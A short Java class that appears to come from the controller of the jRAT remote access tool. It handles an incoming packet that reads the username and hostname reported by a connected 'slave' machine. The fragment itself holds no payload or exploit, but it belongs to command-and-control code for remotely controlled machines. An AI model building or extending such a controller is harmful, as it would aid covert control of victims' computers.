package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;


public class Packet5InitUserHost extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String username = slave.readLine();
		String hostname = slave.readLine();
		
		slave.setUsername(username);
		slave.setHostname(hostname);
	}

}
